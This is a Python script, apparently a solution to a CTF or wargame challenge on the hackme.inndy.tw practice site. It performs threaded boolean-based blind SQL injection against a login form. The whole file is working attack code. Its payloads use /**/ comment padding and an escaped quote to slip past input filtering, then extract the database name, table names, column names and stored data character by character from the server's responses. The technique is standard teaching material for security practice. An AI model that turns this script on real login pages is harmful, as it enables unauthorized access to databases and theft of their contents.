#!/usr/bin/env python
# -*- coding: utf8 -*-
import requests
import threading
import multiprocessing

key = {}
url = "https://hackme.inndy.tw/login1/"

def get_db(i):
	for n in range(32,127):
		payload ={
			"name": "\\'/**/or/**/ord(substr(database(),{},1))={}#".format(i, n),
			"password": "123456"
		}
		r = requests.post(url, data=payload)
		if b"You are not admin!" in r.content:
			key[i] = chr(n)
			print("No.{} Found Key: {}".format(i ,chr(n)))
			break

def get_table(i):
	for n in range(32,127):
		payload ={
			"name": "\\'/**/or/**/ord(substr((SELECT/**/table_name/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=\"login_as_admin1\"/**/limit/**/0,1),{},1))={}#".format(i, n),
			"password": "123456"
		}
		r = requests.post(url, data=payload)
		if b"You are not admin!" in r.content:
			key[i] = chr(n)
			print("No.{} Found Key: {}".format(i ,chr(n)))
			break

def get_column(i):
	for n in range(32,127):
		payload ={ 
			"name": "\\'/**/or/**/ord(substr((SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=\"login_as_admin1\"/**/AND/**/table_name/**/=\"0bdb54c98123f5526ccaed982d2006a9\"/**/limit/**/1,1),{},1))={}#".format(i, n),
			"password": "123456"
		}
		r = requests.post(url, data=payload)
		if b"You are not admin!" in r.content:
			key[i] = chr(n)
			print("No.{} Found Key: {}".format(i ,chr(n)))
			break

def get_data(i):
	for n in range(32,127):
		payload ={
			"name": "\\'/**/or/**/ord(substr((SELECT/**/4a391a11cfa831ca740cf8d00782f3a6/**/FROM/**/0bdb54c98123f5526ccaed982d2006a9/**/limit/**/0,1),{},1))={}#".format(i, n),
			"password": "123456"
		}
		r = requests.post(url, data=payload)
		if b"You are not admin!" in r.content:
			key[i] = chr(n)
			print("No.{} Found Key: {}".format(i ,chr(n)))
			break

def main():
	threads = []
	#threadNum = 20	#for get_db
	#threadNum = 30	#for get_table and get_column
	threadNum = 70	#for get_data
	for count in range(threadNum):
		key[count] = 0
		# threads.append(threading.Thread(target = get_db, args = (count,)))
		# threads.append(threading.Thread(target = get_table, args = (count,)))
		# threads.append(threading.Thread(target = get_column, args = (count,)))
		threads.append(threading.Thread(target = get_data, args = (count,)))
		threads[count].start()		

	for count in range(threadNum):
		threads[count].join()

	print("Key:")
	for count in range(threadNum):
		if key[count] != 0:
			print(key[count], end='')

if __name__ == '__main__':
	main()